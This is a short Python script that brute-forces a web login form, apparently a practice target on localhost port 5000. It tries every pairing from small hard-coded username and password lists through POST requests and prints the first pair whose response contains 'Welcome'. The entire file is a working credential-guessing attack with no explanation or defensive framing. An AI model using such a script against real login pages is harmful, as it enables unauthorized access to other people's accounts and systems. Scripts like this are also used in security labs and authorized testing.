import requests

passwords = ["admin","book","attemp","evening","hello", "password", "bye", "login"]
users = ["admin", "hello", "password", "bye", "login","hard","pug","mops","good"]

url = "http://127.0.0.1:5000/"

for user in users:
    for password in passwords:
        data = {
            "username": user,
            "password": password
        }

        response = requests.post(url, data=data)

        if "Welcome" in response.text:
            print(f"FOUND → username: {user}, password: {password}")
            exit()
